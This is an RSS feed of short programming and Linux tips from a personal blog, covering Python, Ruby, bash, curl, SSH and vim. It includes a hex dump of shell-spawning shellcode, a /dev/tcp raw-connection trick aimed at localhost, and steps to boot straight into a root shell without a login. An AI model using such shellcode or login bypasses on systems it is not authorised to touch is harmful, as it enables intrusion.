+&amp;gt;&amp;gt;&amp;gt; a = [1,2,3] &amp;gt;&amp;gt;&amp;gt; b = [4,5,6] &amp;gt;&amp;gt;&amp;gt; zip(a,b) [(1, 4), (2, 5), (3, 6)] &amp;gt;&amp;gt;&amp;gt; zip(*_) [(1, 2, 3), (4, 5, 6)] I&amp;rsquo;ve included another trick, the _ (underscore) is a shortcut in the interactive interpreter for the last returned value, which works in irb too and likely many others.</description>
+    </item>
+    
+    <item>
+      <title>xor</title>
+      <link>//warrick.io/posts/xor/</link>
+      <pubDate>Sun, 29 Jan 2012 02:27:35 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/xor/</guid>
+      <description>Note to self, stop rewriting these functions, you already have them:
+# xor string str with string ciph def xor(str, ciph) m = (str.size.to_f / ciph.size).ceil z = str.bytes.zip((ciph * m).bytes) z.map { |a| (a[0] ^ a[1]).chr }.join end # xor each byte in string str with byte def xor_each(str, byte) str.each_byte.map { |c| (c ^ byte).chr }.join endxor(&amp;#34;aaa&amp;#34;, &amp;#34;\x01\x01\x01&amp;#34;) xor_each(&amp;#34;aaa&amp;#34;, 0x01)</description>
+    </item>
+    
+    <item>
+      <title>quick basic auth</title>
+      <link>//warrick.io/posts/quick-basic-auth/</link>
+      <pubDate>Sat, 28 Jan 2012 01:56:01 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/quick-basic-auth/</guid>
+      <description>I often go for the man when I wget or curl something from a site with basic auth and completely forget I can do this:
+curl http://USER:PASSWORD@segv.me/some/basic/auth/protected/file Just a little faster on the draw.</description>
+    </item>
+    
+    <item>
+      <title>search and replace continued</title>
+      <link>//warrick.io/posts/search-and-replace-continued/</link>
+      <pubDate>Fri, 27 Jan 2012 02:49:27 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/search-and-replace-continued/</guid>
+      <description>As an extension of Recycling Arguments and the previous post on search and replace using Sed, I would like to show two Bash features for search in replace in previous commands:
+Replace the first instance of foo in the previous command with bar:
+$ cat foo $ ^foo^bar cat bar  OR
+$ cat foo $ !!:s/foo/bar  As you can see the second example uses the word designator with a syntax similar to that of Sed.</description>
+    </item>
+    
+    <item>
+      <title>ruby string.to_class</title>
+      <link>//warrick.io/posts/ruby-string-to_class/</link>
+      <pubDate>Mon, 16 Jan 2012 18:54:14 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/ruby-string-to_class/</guid>
+      <description>class String def to_class Kernel.const_get(self) end endruby-1.8.7-p352 :012 &amp;gt; &amp;#34;Integer&amp;#34;.to_class =&amp;gt; Integer </description>
+    </item>
+    
+    <item>
+      <title>shuffle lines</title>
+      <link>//warrick.io/posts/shuffle-lines/</link>
+      <pubDate>Fri, 13 Jan 2012 03:32:24 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/shuffle-lines/</guid>
+      <description>Using Ruby&amp;rsquo;s special stream, ARGF, shuffling the lines in a file is trivial:
+$ cat foo.txt | ruby -e &amp;quot;puts ARGF.readlines.collect.shuffle rescue Errno::EPIPE&amp;quot;</description>
+    </item>
+    
+    <item>
+      <title>shell uptime</title>
+      <link>//warrick.io/posts/shell-uptime/</link>
+      <pubDate>Fri, 13 Jan 2012 03:23:46 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/shell-uptime/</guid>
+      <description>Bash has many reserved variables, but one of the most fun for screen junkies is the $SECONDS variable, which displays &amp;ldquo;the number of seconds since the shell was started&amp;rdquo;.
+$ echo $SECONDS 2012339 $ echo $(($SECONDS/60)) minutes 33541 minutes $ echo $(($SECONDS/60/60)) hours 559 hours $ echo $(($SECONDS/60/60/24)) days 23 days  http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_02.html</description>
+    </item>
+    
+    <item>
+      <title>bash extglob</title>
+      <link>//warrick.io/posts/bash-extglob/</link>
+      <pubDate>Fri, 13 Jan 2012 03:08:34 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/bash-extglob/</guid>
+      <description>Bash has many advanced features that may not be enabled by default, and as an avid wildcard wielder I find extglob especially useful.
+I use inverse pattern matching most frequently, for example:
+$ ls bar baz foo.jpg quux ^ $ ls !(*.jpg) bar baz quux To enable extglob, simply run:
+$ shopt -s extglobIf the extglob shell option is enabled using the shopt builtin, several extended pattern matching operators are recognized.</description>
+    </item>
+    
+    <item>
+      <title>python child reaping</title>
+      <link>//warrick.io/posts/python-child-reaping/</link>
+      <pubDate>Thu, 12 Jan 2012 19:19:06 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/python-child-reaping/</guid>
+      <description>When creating the &amp;ldquo;hello world&amp;rdquo; of socket programming, a forking echo server/client, programmers often forget to reap child processes.
+Interestingly, Wikipedia has a table of code for automatically reaping children in several different languages.
+In Python it is rather simple using the standard SIG_IGN handler:
+signal.signal(signal.SIGCHLD, signal.SIG_IGN) http://docs.python.org/library/signal.html http://en.wikipedia.org/wiki/SIGCHLD</description>
+    </item>
+    
+    <item>
+      <title>hexdump</title>
+      <link>//warrick.io/posts/hexdump/</link>
+      <pubDate>Thu, 12 Jan 2012 01:15:36 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/hexdump/</guid>
+      <description>Often, when developing shellcode you&amp;rsquo;ll want to dump a file in the backslash hex notation (e.g. \x0A), but hexdump by default outputs input offset, space delimited hex, and ascii representations:
+$ hexdump -C shellcode 00000000 31 c0 31 db 31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 |1.1.1......j.XQh| 00000010 2f 2f 73 68 68 2f 62 69 6e 89 e3 51 89 e2 53 89 |//shh/bin..Q..S.| 00000020 e1 cd 80 |.</description>
+    </item>
+    
+    <item>
+      <title>IP masquerading</title>
+      <link>//warrick.io/posts/ip-masquerading/</link>
+      <pubDate>Wed, 11 Jan 2012 19:31:51 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/ip-masquerading/</guid>
+      <description>Not long ago, I found myself in need of a subnet of virtual machines. Using VirtualBox I configured a number of VMs with Internal Network interfaces and a gateway VM with two interfaces &amp;mdash; one Internal Network interface and one NAT interface.
+It isn&amp;rsquo;t the first time I needed to configure a Linux box as a gateway, but I always forget how to configure IP masquerading. So, needless to say I&amp;rsquo;m taking note of it here:</description>
+    </item>
+    
+    <item>
+      <title>list</title>
+      <link>//warrick.io/posts/list/</link>
+      <pubDate>Wed, 04 Jan 2012 03:53:46 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/list/</guid>
+      <description> man lsusb man lspci man lshw man lsof  </description>
+    </item>
+    
+    <item>
+      <title>bash tcp connections</title>
+      <link>//warrick.io/posts/bash-tcp-connections/</link>
+      <pubDate>Tue, 03 Jan 2012 21:32:07 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/bash-tcp-connections/</guid>
+      <description>Bash, if compiled accordingly, has pseudo-device files that allow you to open TCP connections:
+$ # /dev/tcp/$host/$port  $ echo foo &amp;gt; /dev/tcp/127.0.0.1/57005 Of course, nc is a more functional alternative, but this is an interesting bash feature nonetheless.
+http://tldp.org/LDP/abs/html/devref1.html</description>
+    </item>
+    
+    <item>
+      <title>single user boot for grub 2</title>
+      <link>//warrick.io/posts/single-user-boot-for-grub-2/</link>
+      <pubDate>Wed, 21 Dec 2011 20:16:38 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/single-user-boot-for-grub-2/</guid>
+      <description>Ubuntu changed to grub 2 and I often find myself looking up how to finagle my way into a single user shell.
+Step 1. Hold the right shift to display the grub menu at boot time. Step 2. Select the correct kernel, press CTRL+e to edit the boot command. Step 3. Append the two directives  Single init=/bin/bash  Step 4. Press CTRL+x to boot and wait for the root prompt.</description>
+    </item>
+    
+    <item>
+      <title>fsck on startup</title>
+      <link>//warrick.io/posts/fsck-on-startup/</link>
+      <pubDate>Wed, 21 Dec 2011 20:07:36 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/fsck-on-startup/</guid>
+      <description>Easiest way I&amp;rsquo;ve seen to force fsck on the next boot:
+sudo touch /forcefsck That easy, thanks cyberciti.biz.
+http://www.cyberciti.biz/faq/linux-force-fsck-on-the-next-reboot-or-boot-sequence/</description>
+    </item>
+    
+    <item>
+      <title>SSH config</title>
+      <link>//warrick.io/posts/ssh-config/</link>
+      <pubDate>Mon, 12 Dec 2011 02:04:15 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/ssh-config/</guid>
+      <description>OpenSSH allows you to add configuration directives to ~/.ssh/config with aliases for long hostnames or IP addresses:
+cat &amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; ~/.ssh/config Host segv # desired alias HostName segv.me # ip address works too Port 22 User foo LocalForward localhost:57005 192.168.0.2:57005 IdentityFile ~/.ssh/auxiliary_rsa EOF This solution is better than using /etc/hosts for obvious reasons. There are a great number of options that allow you choose everything from username to encryption cipher preferences on a host-by-host basis.</description>
+    </item>
+    
+    <item>
+      <title>* splat</title>
+      <link>//warrick.io/posts/splat/</link>
+      <pubDate>Sun, 11 Dec 2011 19:08:53 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/splat/</guid>
+      <description>Python has a seldom used unary operator that lets you &amp;ldquo;flatten&amp;rdquo; lists and dictionaries into function arguments.
+def foo(a, b, c): print a, b ,c &amp;gt;&amp;gt;&amp;gt; li = [1, 2 ,3] &amp;gt;&amp;gt;&amp;gt; foo(*li) 1 2 3 The * operator converts a dictionary to keyword arguments:
+def foo(bar=None, baz=None, quux=None): print bar, baz, quux &amp;gt;&amp;gt;&amp;gt; d = {&amp;#34;bar&amp;#34;:1, &amp;#34;baz&amp;#34;:2, &amp;#34;quux&amp;#34;:3} &amp;gt;&amp;gt;&amp;gt; foo(**d) 1 2 3 Simple, but useful.
+http://docs.python.org/tutorial/controlflow.html#unpacking-argument-lists</description>
+    </item>
+    
+    <item>
+      <title>Time.now.to_s(:magic)</title>
+      <link>//warrick.io/posts/time-now-to_s-magic/</link>
+      <pubDate>Sat, 10 Dec 2011 16:18:02 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/time-now-to_s-magic/</guid>
+      <description>Many Rails developers default to strftime for converting their dates to appropriate strings.
+However, Rails has the often overlooked time conversion extensions which are must faster on the draw:
+&amp;gt; t = Time.now =&amp;gt; Sat Dec 10 11:14:04 -0500 2011 &amp;gt; t.to_s(:db) =&amp;gt; &amp;#34;2011-12-10 11:14:04&amp;#34; &amp;gt; t.to_s(:time) =&amp;gt; &amp;#34;11:14&amp;#34; &amp;gt; t.to_s(:short) =&amp;gt; &amp;#34;10 Dec 11:14&amp;#34; &amp;gt; t.to_s(:number) =&amp;gt; &amp;#34;20111210111404&amp;#34;  To see a complete listing of the formats look no further than Time::DATE_FORMATS.</description>
+    </item>
+    
+    <item>
+      <title>Linkage</title>
+      <link>//warrick.io/posts/linkage/</link>
+      <pubDate>Fri, 09 Dec 2011 15:34:55 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/linkage/</guid>
+      <description>I find this incredibly helpful: http://hyperpolyglot.org/scripting</description>
+    </item>
+    
+    <item>
+      <title>Recycle Arguments</title>
+      <link>//warrick.io/posts/recycle-arguments/</link>
+      <pubDate>Fri, 09 Dec 2011 02:36:11 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/recycle-arguments/</guid>
+      <description>Ok, so last post was a bit heavy. How about some more bash. So, thanks to sudo the !! word designator has become very popular:
+$ apache2ctl restart Permission denied: ... $ sudo !! sudo apache2ctl restart Very cool, but you can also reuse arguments with the !! word designator:
+$ cp /home/user/some/really/long/path /home/user/foo $ ls -lha !!:1 ls -lha /home/user/some/really/long/path So this !!:n lets you grab the nth argument, which is cool.</description>
+    </item>
+    
+    <item>
+      <title>Modes of Operation</title>
+      <link>//warrick.io/posts/modes-of-operation/</link>
+      <pubDate>Thu, 08 Dec 2011 02:48:06 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/modes-of-operation/</guid>
+      <description>Knowing which encryption algorithm was used is one thing, but knowing how they used it is another.
+Here are 5 of the 9 NIST approved block cipher modes of operation:
+Electronic Codebook (ECB)
+Simplest of encryption modes.
+Encrypts each block Bi independently.
+ Encryption: **Ci = Ek(Bi)** Ci: ciphertext block i Ek: block encryption algorithm Bi: plaintext block i Decryption: **Bi = Dk(Ci)** Dk: decryption algorithm  Cipher-Block Chaining Mode (CBC)</description>
+    </item>
+    
+    <item>
+      <title>Doh! I forgot to sudo.</title>
+      <link>//warrick.io/posts/doh-i-forgot-to-sudo/</link>
+      <pubDate>Wed, 07 Dec 2011 21:46:00 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/doh-i-forgot-to-sudo/</guid>
+      <description>I often forget to sudo vim. I make significant changes to the file just to find out that I don&amp;rsquo;t have permissions to save the file.
+Well, now that I&amp;rsquo;ve memorized this little gem it doesn&amp;rsquo;t matter:
+:w! sudo tee % The % is a shortcut for the filename. You are really just piping the output through tee to the file - effectively overwriting the contents.
+Ta-dah!</description>
+    </item>
+    
+    <item>
+      <title>Readline Shortcuts</title>
+      <link>//warrick.io/posts/readline-shortcuts/</link>
+      <pubDate>Tue, 06 Dec 2011 22:19:45 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/readline-shortcuts/</guid>
+      <description>CTRL + w delete previous word CTRL + e jump to end of line CTRL + a jump to the beginning of line CTRL + u delete entire line before cursor CTRL + k delete entire line after cursor CTRL + y restore previously deleted word,line,etc. CTRL + l clear the screen  http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html</description>
+    </item>
+    
+    <item>
+      <title>slippy, do a barrel roll</title>
+      <link>//warrick.io/posts/slippy-do-a-barrel-roll/</link>
+      <pubDate>Mon, 05 Dec 2011 01:55:22 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/slippy-do-a-barrel-roll/</guid>
+      <description>Stumbled upon this in a stackoverflow answer. Naive C programmers write this sort of loop:
+for (int cnt=0; cnt &amp;lt; strlen(s) ; cnt++) { /* some code */ } That&amp;rsquo;s logically an O(n2) algorithm because of the implementation of strlen().
+Even though I know strlen is implemented very efficiently, let&amp;rsquo;s not do this.
+http://stackoverflow.com/questions/111426/did-you-apply-computational-complexity-theory-in-real-life/111861#111861</description>
+    </item>
+    
+    <item>
+      <title>Binary in Python</title>
+      <link>//warrick.io/posts/binary-in-python/</link>
+      <pubDate>Sat, 03 Dec 2011 23:14:03 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/binary-in-python/</guid>
+      <description>Somehow, I often find myself wanting the binary representation of an integer.
+Well, Python of course has the builtin bin function, but the output always begins with a pesky 0b.
+Furthermore, bin doesn&amp;rsquo;t support padding the binary to a certain length (e.g. 8 bits). So, I use string format:
+&amp;gt;&amp;gt;&amp;gt; bin(63) &amp;#39;0b111111&amp;#39; &amp;gt;&amp;gt;&amp;gt; &amp;#39;{0:08b}&amp;#39;.format(63) &amp;#39;00111111&amp;#39; Just for fun, here is a somewhat comical and more complicated example for converting an ascii string to binary:</description>
+    </item>
+    
+  </channel>
+</rss>
